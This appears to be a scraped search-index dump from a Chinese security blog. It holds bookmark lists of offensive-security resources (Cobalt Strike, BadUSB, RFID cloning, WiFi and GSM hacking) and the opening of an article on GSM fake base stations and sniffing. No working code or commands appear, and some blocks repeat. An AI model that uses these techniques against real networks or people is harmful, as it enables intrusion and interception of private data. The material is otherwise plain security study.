Building a Kernel for the Razor Phone 2 - Live feed Information on Compiling Android Kernels with Clang [内核向] - 交叉编译器的选择 ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:11:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#0x10-相关链接"},{"categories":null,"content":" 1 渗透相关Web安全学习笔记 狼组安全团队公开知识库 The Hacker Recipes 潇湘信安安全知识库 HackTricks-有关渗透等的 Hack 技术分享 Cobalt Strike资源 APT实战资源 渗透测试相关资料 渗透测试学习笔记 安全导航网址 - HACK学习社区 渊龙Sec安全团队导航 安全圈Info - 信息安全导航 渗透师导航 一份自己的安全学习浏览器书签 - ssooking 远控免杀专题文章 某国产浏览器中间人漏洞Bettercap安全测试 ","date":"2021-09-04","objectID":"/notes/:1:0","series":null,"tags":null,"title":"备忘录","uri":"/notes/#渗透相关"},{"categories":null,"content":" 2 工具使用Kali Linux - Documentation 中间人攻击之Bettercap工具使用 揭秘Bettercap，教你如何使用这款优秀的中间人工具！ 工具使用 | Bettetcap 2.X版本 使用 工具的使用 | Shodan的基本使用 psexec工具的使用 工具使用文章总结 | 谢公子学安全 CobaltStrike使用详解 Sqlmap使用详解 Impacket套件之远程命令执行功能讲解 BurpSuite v2020.8的汉化以及无cmd框启动 如何正确的导入BurpSuite证书 ","date":"2021-09-04","objectID":"/notes/:2:0","series":null,"tags":null,"title":"备忘录","uri":"/notes/#工具使用"},{"categories":null,"content":" 3 渗透技巧渗透技巧-从Github下载文件的多种方法 关于Burp Intruder模块的小技巧 新手福利 | Burpsuite你可能不知道的技巧 BurpSuite系列 | 基础技巧（一） 反溯源 - CS和MSF域名上线 安卓APP抓包之双向认证突破 ","date":"2021-09-04","objectID":"/notes/:3:0","series":null,"tags":null,"title":"备忘录","uri":"/notes/#渗透技巧"},{"categories":null,"content":" 4 Web Penetration TestBurp Suite Releases Notes Burp Suite Loader\u0026Keygen相关资源 BurpSuite实战指南 「Burpsuite练兵场」Portswigger Web Security Academy介绍 「Burpsuite练兵场」第二节：验证机制漏洞 「Burpsuite练兵场」验证机制漏洞（下篇） 「Burpsuite练兵场」SQL注入及相关实验（一） 「Burpsuite练兵场」SQL注入及相关实验（二） 「Burpsuite练兵场」SQL注入之盲注（上篇） 「Burpsuite练兵场」SQL注入之盲注（下篇） 「Burpsuite练兵场」SQL注入之带外通信 「Burpsuite练兵场」CSRF（一） 「Burpsuite练兵场」CSRF（二） 「Burpsuite练兵场」HTTP请求走私的基本原理 「Burpsuite练兵场」如何探查并确认HTTP走私漏洞 「Burpsuite练兵场」目录遍历 梨子带你刷burpsuite靶场系列 DVWA - 常见web漏洞介绍-上 DVWA - 常见web漏洞介绍-下 Web漏洞文章总结 - 谢公子学安全 SQL注入总结 SQL注入原理及分析 XSS攻击利用方法总结 当英雄联盟钓鱼网站遇到脚本黑客 极限环境Certutil加Powershell配合Burp快速落地文件 ","date":"2021-09-04","objectID":"/notes/:4:0","series":null,"tags":null,"title":"备忘录","uri":"/notes/#web-penetration-test"},{"categories":null,"content":" 5 Metasploit FrameworkMetasploit系列课程 || Demonsec’s Blog Metasploit Framework Handbook (一) Metasploit Framework Handbook (二) Metasploit Framework Handbook (三) Metasploit Framework Handbook (四) Metasploit Unleashed || Offensive Security MSF使用详解 Metasploit Framework Wiki ——Rapid7 萌新科普 手把手教你如何用MSF进行后渗透测试 从CVE-2020-0796到Meterpreter后渗透攻击 深入了解Metasploit框架的AV免杀新功能 ","date":"2021-09-04","objectID":"/notes/:5:0","series":null,"tags":null,"title":"备忘录","uri":"/notes/#metasploit-framework"},{"categories":null,"content":" 6 RedTeam \u0026\u0026 内网渗透红蓝对抗之Windows内网渗透 『红蓝对抗』内网渗透之域渗透（一） 红蓝对抗之邮件钓鱼攻击 技术分享 | 内网渗透手动学习实践 十多年“渗透攻击”经验分享——Micro8 [译] 渗透测试实战第三版(红队版) Awesome CobaltStrike Cobalt Strike 实战指南 Cobalt Strike Backup Cobalt Strike 学习笔记 CS学习笔记合集 红队渗透手册之域渗透基础篇 【建议收藏】内网学习笔记合集 内网横向移动学习备忘录 域内横向移动一 域内横向移动二 域渗透一条龙手册 WMI利用(横向移动) 浅探内网横向移动-Pass The Hash 今天老生常谈 Pass The Hash 横向移动之WinRM横向移动 Hacking Windows 备忘录 内网信息收集清单 内网信息收集：WMIC使用总结 Windows提权总结 Windows权限维持技术整理 内网渗透 – 提升权限(通过提高程序运行级别) 红队和蓝队资料集锦 RedTeaming Tookit Collection Exploit Datebase Windows平台提权漏洞集合 - SecWiki Linux平台提权漏洞集合 - SecWiki ","date":"2021-09-04","objectID":"/notes/:6:0","series":null,"tags":null,"title":"备忘录","uri":"/notes/#redteam--内网渗透"},{"categories":null,"content":" 7 逆向Reverse相关 [翻译] Ghidra 简介 [分享] Ghidra 分析程序及个人感受 Ghidra入门系列教程 关于Ghidra工具比较详细的用法 Using Ghidra to Reverse WiFi Pineapple Protection IDA Pro简介 IDA Pro的基本使用 IDA Pro使用技巧总结 IDA Pro反汇编工具初识及逆向工程解密实战 全功能的二进制文件分析工具 Radare2 指南 x64dbg入门系列（一）- 认识x64dbg x64dbg入门系列（二）- 搜索字符串 x64dbg入门系列（三）- 函数参考 x64dbg入门系列（四）- 内存断点 x64dbg入门系列（五）- 消息断点 x64dbg入门系列（六）- 实战硬件断点 [原创]x64dbg使用技巧与实用插件合集 x64dbg入门之工具使用实战 使用x64dbg脱壳之开源壳upx x64dbg破解64位WinSnap4.5.6图文视频教程 一起来逆向分析吃鸡外挂 ","date":"2021-09-04","objectID":"/notes/:7:0","series":null,"tags":null,"title":"备忘录","uri":"/notes/#逆向reverse相关"},{"categories":null,"content":" 8 安卓搞机\u0026内核相关 ","date":"2021-09-04","objectID":"/notes/:8:0","series":null,"tags":null,"title":"备忘录","uri":"/notes/#安卓搞机内核相关"},{"categories":null,"content":" 8.1 社区论坛AKR-安卓开发者社区 MoKee Open Source Community XDA Developers Android Forums ","date":"2021-09-04","objectID":"/notes/:8:1","series":null,"tags":null,"title":"备忘录","uri":"/notes/#社区论坛"},{"categories":null,"content":" 8.2 安卓内核编译Android Releases-XWiki(CAF) Android Linux Stable Project How to Compile Kernel Standalone Information on Compiling Android Kernels with Clang How to Rebase Android Kernel to latest CAF tag How to Update your Android Kernel to latest Linux Stable How to merge latest CAF tag in Kernel ","date":"2021-09-04","objectID":"/notes/:8:2","series":null,"tags":null,"title":"备忘录","uri":"/notes/#安卓内核编译"},{"categories":null,"content":" 8.3 Kali NetHunter Kernel Compile“黑客手机\"免费送-知乎专栏 Compile Kali NetHunter 跟我把Kali NetHunter编译至任意手机 Kali NetHunter Documentation Building a Kernel for the Razor Phone 2 - Live feed 专为 HackRF 和 Proxmark 3 而构建的支持多种测试功能的 Android 内核 Shuriken Android CyanogenMod Kernel Building: Monitor Mode on Any Android Device with a Wireless Adapter OnePlus 5T-NetHunter内核包下载 OnePlus 5T-NetHunter内核源码 Kali NetHunter Store ","date":"2021-09-04","objectID":"/notes/:8:3","series":null,"tags":null,"title":"备忘录","uri":"/notes/#kali-nethunter-kernel-compile"},{"categories":null,"content":" 8.4 安卓ROM编译Bulid LineageOS for santoni 如何自己编译自定义 Android ROM 从0开始编译Android类原生系统 Android 镜像使用帮助 LineageOS 源代码镜像使用帮助 Ubuntu 20.04 LTS下编译 LineageOS源码 来个ROM编译教程,其实并不难,适用于各种第三方源码编译 ","date":"2021-09-04","objectID":"/notes/:8:4","series":null,"tags":null,"title":"备忘录","uri":"/notes/#安卓rom编译"},{"categories":null,"content":" 8.5 Linux Kernel DevelopmentLinux Kernel New Bies Linux内核编译配置详解 关于内核的一些配置 如何获取当前内核的编译配置文件 ","date":"2021-09-04","objectID":"/notes/:8:5","series":null,"tags":null,"title":"备忘录","uri":"/notes/#linux-kernel-development"},{"categories":null,"content":" 8.6 安卓搞机Xposed Module Repository Download YouTube Video Using Terminal Emulator by Root Boy How to Share Internet from Windows, Mac or Linux to Android device How to Force Move Apps to SD card in Android Android 7.1.1 消除网络报错小叉叉的N种方法 Termux高级终端安装使用配置教程 ","date":"2021-09-04","objectID":"/notes/:8:6","series":null,"tags":null,"title":"备忘录","uri":"/notes/#安卓搞机"},{"categories":null,"content":" 9 无线电近源渗透相关 ","date":"2021-09-04","objectID":"/notes/:9:0","series":null,"tags":null,"title":"备忘录","uri":"/notes/#无线电近源渗透相关"},{"categories":null,"content":" 9.1 HID ATTACK \u0026\u0026 BadUSB新的U盘自动运行——BadUSB原理与实现 极客DIY : 打造你的专属黑客U盘 针对基于Phison(群联)U盘的BadUSB攻击 DIY一个专属HID注入设备吧 “硬核”武器-使用CDFS打造一个特殊的u盘 USB Rubber Ducky(BadUSB)语法 由Arduino Leonardo初识BadUSB 针对USB外设的命令注入渗透 打造自己的HID Attack武器库-喵神 基于Arduino Leonardo板子的BadUSB攻击实战 BadUSB测试 BadUSB简单免杀一秒上线CobaltStrike BadUSB实现后台静默执行上线CobaltStrike BadUSB的初步探索(针对windows研究) 如何用BadUSB快速窃取资料(绕过杀软，UAC，防火墙) 玩转NetHunter:手到擒来的HID攻击 WHID Injector ‖ Wiki 基于P4wnP1镜像将Raspberry Pi Zero W变成BadUSB设备，最终实现逃脱杀毒软件检测的安全研究 近源渗透 P4wnP1_Aloa（一） MouseJack Hacking : 如何利用MousJack进行物理攻击 利用罗技漏洞制作一个特别的BadUSB UberDucky - 通过 BLE 触发的无线 USB 橡皮鸭 ","date":"2021-09-04","objectID":"/notes/:9:1","series":null,"tags":null,"title":"备忘录","uri":"/notes/#hid-attack--badusb"},{"categories":null,"content":" 9.2 RFID HackingRFID 破解基础详解 【干货】你想知道关于破解门禁/饭卡的一切 RFID \u0026 NFC之自制NFC手表 Proxmark实验室 ACR122读卡器在Kali Linux下的基本用法 办公楼门禁卡的克隆 克隆新小区门禁卡 在Linux系统上使用Proxmark3 Proxmark3 命令帮助（适用2.0版本） - RadioWar Wiki 在macOS系统上使用Proxmark3 Clone IC Card with Proxmark3 【RFID Hacking ①】看我如何突破门禁潜入FreeBuf大本营 【RFID Hacking ②】PM3入门指南 【RFID Hacking ③】ProxMark3 使用案例：嗅探银行闪付卡信息 【RFID Hacking ④】ProxMark3 破解门禁 RFID实战应用之常见射频卡扇区数据分析及破解 RFID安全入门：PN532 模块的 Windows libnfc 和 mfcuk 编译及使用 闪付卡（QuickPass）隐私泄露原理 ChipToNFC: NFC 本地中继和嗅探研究 针对 NFC 支付的中继攻击介绍 使用 LoRa 实现对 NFC 支付的中继攻击 Proxmark3 RfidResearchGroup Repo PM3命令帮助-Iceman PM3资源-Iceman MagSpoof(磁条卡模拟) ","date":"2021-09-04","objectID":"/notes/:9:2","series":null,"tags":null,"title":"备忘录","uri":"/notes/#rfid-hacking"},{"categories":null,"content":" 9.3 802.11 WiFi HackingWiFi 四路握手认证过程介绍 WiFi 安全与攻击案例分析 Wi-Fi攻击方式简述 Wi-Fi安全 –《黑客大揭秘:近源渗透测试》试读 利用PMKID破解PSK的实际测试与影响评估 [翻译] 利用 Hostapd-WPE 渗透企业无线网络 使用 Bettercap 结合 PMKID 手法攻击 WPA/WPA2 网络 WiFi Pineapple的Karma攻击与原理探究 现代无线侦察技术（一）：伪基站(AP)攻击基本理论篇 现代无线侦察技术（二）：MANA 和已知信标攻击 现代无线通信技术（三）：管理帧访问控制列表(MFACL) 战争从未改变: 对 WPA3“增强开放”的攻击ーー第一部分: 我们是如何走到这一步的 战争从未改变: 攻击 WPA3的增强开放性——第二部分: 理解 OWE（上） 战争从未改变: 攻击 WPA3的增强开放性——第二部分: 理解 OWE（下） 战争从未改变: 攻击 WPA3的增强开放性——第三部分: 在风险方面与开放无线几乎无异 WPA3最新漏洞DRAGONBLOOD 披露一种针对WiFi WPA/WPA2协议的MOTS(Man-On-The-Side)的攻击方式 在 Windows 系统的 WPA2 Enterprise 中恢复 WPA2 PSK 的密码 Project Dribble: 通过 JavaScript 缓存投毒的方式攻击 Wi-Fi Pioson Tap(近源缓存投毒和持久性后门) Ghost Tunnel: 适用于隔离网络的WiFi隐蔽传输通道 Pass the hash WiFi ","date":"2021-09-04","objectID":"/notes/:9:3","series":null,"tags":null,"title":"备忘录","uri":"/notes/#80211-wifi-hacking"},{"categories":null,"content":" 9.4 Bluetooth \u0026\u0026 BLE HackingCVE-2020-0022 蓝牙漏洞初探（上）一个bug引发的血案 蓝牙冒充攻击（BIAS）漏洞原理分析 BIAS：蓝牙冒充攻击 对低功耗蓝牙（BLE）的简要学习分析 低功耗蓝牙（BLE）攻击分析 BLE安全初探之HACKMELOCK 破解与攻击智能门锁 Hacking Loccess 智能锁 低功耗蓝牙（BLE）入门之如何调戏别人的小米手环 如何进行对 Xiaomi MiBand 2 的攻击 BLE Hacking：使用Ubertooth one扫描嗅探低功耗蓝牙 低功耗蓝牙重放攻击实战 无线信号分析之谁开了他的门 ","date":"2021-09-04","objectID":"/notes/:9:4","series":null,"tags":null,"title":"备忘录","uri":"/notes/#bluetooth--ble-hacking"},{"categories":null,"content":" 9.5 Sub-1GHz \u0026\u0026 SDR RF HackingUbuntu 18.04配置GNURadio基础环境 GNU Radio 3.8.0.0安装 GNU Radio教程（一） GNU Radio教程（三） 软件定义无线电(SDR)的系列教程 HackRF入门：家用无线门铃信号重放 如何使用SDR+Inspectrum逆向分析无线遥控信号 GNU Radio Hacking ①：使用GNU Radio破解固定码无线遥控 GNU Radio Hacking ②：使用SDR嗅探北欧芯片无线键盘鼠标数据包 LimeSDR 上手指南 LimeSDR 上手指南 | LimeSDR Getting Starded Quickly LimeSDR 无线信号重放攻击和逆向分析 使用 YARD Stick One 进行重放信号 KillBee框架的使用（上） KillerBee 框架使用（二） 101 Things to do with a LimeSDR PlutoSDR入门指南 DIY天线+SDR+GNURadio实现低成本接收解码韩国GK-2A气象卫星信号 如何接收和解码印度GPS卫星的信号 RTL-SDR AIS 接收 ","date":"2021-09-04","objectID":"/notes/:9:5","series":null,"tags":null,"title":"备忘录","uri":"/notes/#sub-1ghz--sdr-rf-hacking"},{"categories":null,"content":" 9.6 GPS HackingGPS定位欺骗 GPS欺骗实验 利用HackRF进行GPS劫持实验流程攻略 ","date":"2021-09-04","objectID":"/notes/:9:6","series":null,"tags":null,"title":"备忘录","uri":"/notes/#gps-hacking"},{"categories":null,"content":" 9.7 GSM/CDMA/LTE Hacking \u0026\u0026 Base StationsGSM Hacking Part ① ：使用SDR扫描嗅探GSM网络 GSM Hacking Part ② ：使用SDR捕获GSM网络数据并解密 Sniffing GSM Traffic with HackRF Passive IMSI Catcher [原创]GSM Sniffing入门（硬件篇1-2楼，软件篇6楼） [翻译]剖析 GSM 加密机制以及位置更新的过程 OpenBTS使用指南 LimeSDR+OsmoTRX+OpenBTS搭建GSM基站 Build a GSM Network with OpenBSC OsmoBTS OsmoTRX and USRP B210 on a Single PC Creating Your Own GSM Network with LimeSDR Stage Admisys Documentation Osmocom Accelerate3g5 WiKi 使用srsLTE搭建4G基站用于日常测试 使用BladeRF或者B210快速构建4G LTE测试网 使用GNU Radio + OpenLTE + SDR 搭建4G LTE基站 Ubuntu 16.04系统LimeSDR使用srsLTE搭建LTE实验环境 Ubuntu 16.04系统LimeSDR V1.4使用最新版本的OpenAirInterface5g代码搭建LTE实验环境 Build a LTE Network with srsLTE and Program Your Own USIM Card 5G-Nr-Development-and-Setup I OpenAirInterface-5G – Wikis 走进“开源SDR实验室” 一起玩转4G/5G开源项目srsRAN(srsLTE升级版)：安装方法+NB-IoT测试 ","date":"2021-09-04","objectID":"/notes/:9:7","series":null,"tags":null,"title":"备忘录","uri":"/notes/#gsmcdmalte-hacking--base-stations"},{"categories":null,"content":" 9.8 Car Hacking汽车安全测试Checklist 车联网安全系列——特斯拉iBeacon隐私泄露 Hacking All The Cars - CAN总线逆向 车联网安全系列——特斯拉 NFC 中继攻击（CVE-2020-15912） UCLA ECE209AS（Winter 2018）：汽车无钥匙门禁系统中继攻击 越狱 Subaru StarLink 汽车中控系统并实现持久化访问 汽车智能警报器的安全问题分析 ","date":"2021-09-04","objectID":"/notes/:9:8","series":null,"tags":null,"title":"备忘录","uri":"/notes/#car-hacking"},{"categories":null,"content":" 9.9 工控安全工控靶场演示 从外网到内网设备的入侵 ","date":"2021-09-04","objectID":"/notes/:9:9","series":null,"tags":null,"title":"备忘录","uri":"/notes/#工控安全"},{"categories":null,"content":" 10 博客 ","date":"2021-09-04","objectID":"/notes/:10:0","series":null,"tags":null,"title":"备忘录","uri":"/notes/#博客"},{"categories":null,"content":" 10.1 个人博客Demonsec’s Blog 国光 Blog 倾旋的博客 三好学生博客 Snowming04’s Blog WBGlil’s blog 清风明月’s Blog 九世’s Blog ssooking - 博客园 干货集中营 - 算命縖子 cnhack’s blog Nuclear’Atk (核攻击) 网络安全实验室 独自等待博客 伍默’s Blog Mrxn’s Blog K8哥哥’s Blog S1NH’s Blog Evi1cg’s Blog TeamsSix’s Blog Guko’s Blog 0r@nge の窝 AresX’s Blog AabyssZG’s Blog JD1412’s Blog Gray.Ad’s Blog HexChristmas’s Blog 驱蚊器喵的插座 小晨曦’s Blog 雨苁ℒ Blog 极客实验室 ","date":"2021-09-04","objectID":"/notes/:10:1","series":null,"tags":null,"title":"备忘录","uri":"/notes/#个人博客"},{"categories":null,"content":" 10.2 团队博客即刻安全 Blog 360 安全核心技术博客 360 RedTeam Blog 360 0Kee Team Blog 长亭博客 腾讯安全应急响应中心博客 ChaBug安全博客 MS08067 安全实验室 渊龙Sec安全团队博客 UKnowSec ","date":"2021-09-04","objectID":"/notes/:10:2","series":null,"tags":null,"title":"备忘录","uri":"/notes/#团队博客"},{"categories":null,"content":" 10.3 无线电\u0026硬件极客雪碧 0xroot | RadioHub | IoT RF Hardware Hacking | 博观而约取 厚积而薄发 K1two2’s Geek Hub IterNull Blog 物联网安全百科 360无线电安全研究院 White-Alone’s Blog Jarvis’s Blog Yaseng’s Blog 一只猿 - 前端攻城尸 默默的点滴 - 智障儿童欢乐多 HackRF.net RTL-SDR Blog WIATTACK’s Blog Firefox2100’s Blog MyriadRF论坛 VKSDR - RF,SDR,Satellites BG1ICA的HAM茶馆 ","date":"2021-09-04","objectID":"/notes/:10:3","series":null,"tags":null,"title":"备忘录","uri":"/notes/#无线电硬件极客"},{"categories":null,"content":" 11 常逛的论坛\u0026社区 ","date":"2021-09-04","objectID":"/notes/:11:0","series":null,"tags":null,"title":"备忘录","uri":"/notes/#常逛的论坛社区"},{"categories":null,"content":" 11.1 安全社区FreeBuf T00ls 先知社区 奇安信攻防社区 90Sec社区 看雪论坛 SecPulse - 安全脉搏 吾爱破解论坛 i春秋论坛 SecIN安全社区 零组交流社区 Web 安全交流圈 ParrotSec中文社区 Kali论坛 ","date":"2021-09-04","objectID":"/notes/:11:1","series":null,"tags":null,"title":"备忘录","uri":"/notes/#安全社区"},{"categories":null,"content":" 11.2 安全新闻FreeBuf 嘶吼 RoarTalk 安全客 每日安全 - 腾讯玄武实验室 MottIN互联网威胁情报社区 ","date":"2021-09-04","objectID":"/notes/:11:2","series":null,"tags":null,"title":"备忘录","uri":"/notes/#安全新闻"},{"categories":null,"content":" 11.3 PapersSeeBug Paper Exploit Datebase Papers ","date":"2021-09-04","objectID":"/notes/:11:3","series":null,"tags":null,"title":"备忘录","uri":"/notes/#papers"},{"categories":null,"content":" 11.4 Exploit搜索Exploit Datebase Papers Cybercrime Sploitus ","date":"2021-09-04","objectID":"/notes/:11:4","series":null,"tags":null,"title":"备忘录","uri":"/notes/#exploit搜索"},{"categories":null,"content":" 11.5 在线沙盒VirusTotal Anyrun ","date":"2021-09-04","objectID":"/notes/:11:5","series":null,"tags":null,"title":"备忘录","uri":"/notes/#在线沙盒"},{"categories":null,"content":" 11.6 红队资源Ired.team 0xsp.com Awesome-Red-Teaming RedTeam-NoteBook Red Team Notes 2.0 MITRE | ATT\u0026CK 中文站 ","date":"2021-09-04","objectID":"/notes/:11:6","series":null,"tags":null,"title":"备忘录","uri":"/notes/#红队资源"},{"categories":null,"content":" 11.7 越狱苹果越狱对照表 ","date":"2021-09-04","objectID":"/notes/:11:7","series":null,"tags":null,"title":"备忘录","uri":"/notes/#越狱"},{"categories":null,"content":" 11.8 代码审计PHP Codes Aduit工具 代码审计入门 ","date":"2021-09-04","objectID":"/notes/:11:8","series":null,"tags":null,"title":"备忘录","uri":"/notes/#代码审计"},{"categories":null,"content":"  DoIt 是一个由 HEIGE-PCloud 开发的简洁、优雅且高效的 Hugo 博客主题。 它的原型基于 LoveIt 主题， LeaveIt 主题 和 KeepIt 主题。 ","date":"2019-08-02","objectID":"/about/:0:0","series":null,"tags":null,"title":"关于 DoIt","uri":"/about/#"},{"categories":null,"content":" 1 特性","date":"2019-08-02","objectID":"/about/:1:0","series":null,"tags":null,"title":"关于 DoIt","uri":"/about/#特性"},{"categories":null,"content":" 1.1 性能和 SEO  性能优化：在 Google PageSpeed Insights 中， 99/100 的移动设备得分和 100/100 的桌面设备得分  使用基于 JSON-LD 格式 的 SEO SCHEMA 文件进行 SEO 优化  支持 Google Analytics  支持 Fathom Analytics  支持 百度统计  支持 Umami Analytics  支持 Plausible Analytics  支持搜索引擎的网站验证 (Google, Bind, Yandex and Baidu)  支持所有第三方库的 CDN ","date":"2019-08-02","objectID":"/about/:1:1","series":null,"tags":null,"title":"关于 DoIt","uri":"/about/#性能和-seo"},{"categories":null,"content":" 1.2 外观和布局 / 响应式布局 / 浅色/深色 主题模式  全局一致的设计语言  支持分页  易用和自动展开的文章目录  支持多语言和国际化  美观的 CSS 动画 ","date":"2019-08-02","objectID":"/about/:1:2","series":null,"tags":null,"title":"关于 DoIt","uri":"/about/#外观和布局"},{"categories":null,"content":" 1.3 社交和评论系统  支持 Gravatar 头像  支持本地头像  支持多达 64 种社交链接  支持多达 28 种网站分享  支持 Disqus 评论系统  支持 Gitalk 评论系统  支持 Valine 评论系统  支持 Waline 评论系统  支持 Facebook 评论系统  支持 Telegram comments 评论系统  支持 Commento 评论系统  支持 Utterances 评论系统  支持 Twikoo 评论系统  支持 Vssue 评论系统  支持 Remark42 评论系统  支持 giscus 评论系统  支持 Artalk 评论系统 ","date":"2019-08-02","objectID":"/about/:1:3","series":null,"tags":null,"title":"关于 DoIt","uri":"/about/#社交和评论系统"},{"categories":null,"content":" 1.4 扩展功能  支持基于 algolia 或 Fuse.js 的搜索  支持 Twemoji  支持代码高亮  一键复制代码到剪贴板  支持基于 lightgallery.js 的图片画廊  支持 Font Awesome 图标的扩展 Markdown 语法  支持上标注释的扩展 Markdown 语法  支持分数的扩展 Markdown 语法  支持基于 $ \\KaTeX $ 的数学公式  支持基于 mermaid 的图表 shortcode  支持基于 ECharts 的交互式数据可视化 shortcode  支持基于 Mapbox GL JS 的 Mapbox shortcode  支持基于 APlayer 和 MetingJS 的音乐播放器 shortcode  支持 Bilibili 视频 shortcode  支持多种注释的 shortcode  支持自定义样式的 shortcode  支持自定义脚本的 shortcode  支持基于 TypeIt 的打字动画 shortcode  支持基于 cookieconsent 的 Cookie 许可横幅 … ","date":"2019-08-02","objectID":"/about/:1:4","series":null,"tags":null,"title":"关于 DoIt","uri":"/about/#扩展功能"},{"categories":null,"content":" 2 许可协议DoIt 根据 MIT 许可协议授权。 更多信息请查看 LICENSE 文件。 DoIt 主题中用到了以下项目，感谢它们的作者： normalize.css Font Awesome Simple Icons Animate.css autocomplete.js algoliasearch Fuse.js object-fit-images Twemoji lightgallery.js clipboard.js Sharer.js TypeIt $ \\KaTeX $ mermaid ECharts Mapbox GL JS APlayer MetingJS Gitalk Valine Waline Twikoo Vssue cookieconsent Remark42 ","date":"2019-08-02","objectID":"/about/:2:0","series":null,"tags":null,"title":"关于 DoIt","uri":"/about/#许可协议"},{"categories":null,"content":"大佬们 Demonsec666's Blog Demonsec666 - 没有绝对安全的系统 国光's Blog 国光 - 分享与收获 Sp4ce's Blog Sp4ce's Blog - Focus on cyber security ","date":"2019-08-02","objectID":"/friends/:0:0","series":null,"tags":null,"title":"我的朋友们","uri":"/friends/#"},{"categories":["wireless-hacking"],"content":"本文介绍了 GSM 网络安全性的探究并结合实际的例子证明其危害性。","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/"},{"categories":["wireless-hacking"],"content":" 注意 本文首发于信安之路微信公众号 文章链接: https://mp.weixin.qq.com/s/ndsPZk2dZ-8p9PhUhp45pg 作者: 记忆里的纯真 最近查找资料的时候发现了前段时间被爆出来的利用 GSM 劫持+短信嗅探的方式来盗刷银行卡的案例，想起来一直想写一篇关于 GSM 的文章，故写此文来浅谈一下 GSM 网络的安全性。 警告 注意: 此文涉及的内容具有一定的风险性，只可用作技术研究。切勿用于非法目的！！！ 注意: 此文涉及的内容具有一定的风险性，只可用作技术研究。切勿用于非法目的！！！ 注意: 此文涉及的内容具有一定的风险性，只可用作技术研究。切勿用于非法目的！！！ ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:0:0","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#"},{"categories":["wireless-hacking"],"content":" 1 原理剖析 1.0.1 GSM 通信基本原理GSM 分配的频段主要有两个频段，分别是 GSM900 和 GSM1800，其中 GSM900 的上行频段是 890-915MHz，下行频段是 935-960MHz。GSM1800 的上行频段是 1710-1785MHz，它的下行频段是 1805-1880MHz。GSM900 占带宽 25M，GSM1800 占带宽 75M。由载频带宽 200KHz，所以 GSM900 上下频点各是 25x5-1 一共 124 个，GSM1800 的上下频点各是 75x5-1 一共 374 个。 关于为什么会出现这个问题？ 这就要从 GSM 网络说起了 我们马上都要进入 5G 时代了，但是现在还有大量的 2G 的 GSM 网络存在，现在的 GSM 网络主要是中国移动的用户，中国电信没有 GSM 的网络，中国联通正在清退 GSM 网络。 GSM 网络有个很致命的缺点就是有很多伪基站，手机在打电话或者发短信的时候，手机是先连到离你最近的基站 (BTS) 然后在进入 RNC, MSC 进行核心网络的交换，在发给离对方最近的基站在传送到对方的手机，如果这个时候你手机进入的不是运营商的基站而且伪基站那就麻烦了。 1.0.2 为什么我们手机会进入假基站？这是因为 GSM 网络的鉴权存在的缺陷运营商是验证你手机是否合法用户，而手机是不会验证接入基站是否是合法的基站，这样进入了伪基站我们也是不知道的，如今的 3G,4G 验证会比 GSM 要安全很多。 ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:1:0","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#原理剖析"},{"categories":["wireless-hacking"],"content":" 1 原理剖析 1.0.1 GSM 通信基本原理GSM 分配的频段主要有两个频段，分别是 GSM900 和 GSM1800，其中 GSM900 的上行频段是 890-915MHz，下行频段是 935-960MHz。GSM1800 的上行频段是 1710-1785MHz，它的下行频段是 1805-1880MHz。GSM900 占带宽 25M，GSM1800 占带宽 75M。由载频带宽 200KHz，所以 GSM900 上下频点各是 25x5-1 一共 124 个，GSM1800 的上下频点各是 75x5-1 一共 374 个。 关于为什么会出现这个问题？ 这就要从 GSM 网络说起了 我们马上都要进入 5G 时代了，但是现在还有大量的 2G 的 GSM 网络存在，现在的 GSM 网络主要是中国移动的用户，中国电信没有 GSM 的网络，中国联通正在清退 GSM 网络。 GSM 网络有个很致命的缺点就是有很多伪基站，手机在打电话或者发短信的时候，手机是先连到离你最近的基站 (BTS) 然后在进入 RNC, MSC 进行核心网络的交换，在发给离对方最近的基站在传送到对方的手机，如果这个时候你手机进入的不是运营商的基站而且伪基站那就麻烦了。 1.0.2 为什么我们手机会进入假基站？这是因为 GSM 网络的鉴权存在的缺陷运营商是验证你手机是否合法用户，而手机是不会验证接入基站是否是合法的基站，这样进入了伪基站我们也是不知道的，如今的 3G,4G 验证会比 GSM 要安全很多。 ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:1:0","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#gsm-通信基本原理"},{"categories":["wireless-hacking"],"content":" 1 原理剖析 1.0.1 GSM 通信基本原理GSM 分配的频段主要有两个频段，分别是 GSM900 和 GSM1800，其中 GSM900 的上行频段是 890-915MHz，下行频段是 935-960MHz。GSM1800 的上行频段是 1710-1785MHz，它的下行频段是 1805-1880MHz。GSM900 占带宽 25M，GSM1800 占带宽 75M。由载频带宽 200KHz，所以 GSM900 上下频点各是 25x5-1 一共 124 个，GSM1800 的上下频点各是 75x5-1 一共 374 个。 关于为什么会出现这个问题？ 这就要从 GSM 网络说起了 我们马上都要进入 5G 时代了，但是现在还有大量的 2G 的 GSM 网络存在，现在的 GSM 网络主要是中国移动的用户，中国电信没有 GSM 的网络，中国联通正在清退 GSM 网络。 GSM 网络有个很致命的缺点就是有很多伪基站，手机在打电话或者发短信的时候，手机是先连到离你最近的基站 (BTS) 然后在进入 RNC, MSC 进行核心网络的交换，在发给离对方最近的基站在传送到对方的手机，如果这个时候你手机进入的不是运营商的基站而且伪基站那就麻烦了。 1.0.2 为什么我们手机会进入假基站？这是因为 GSM 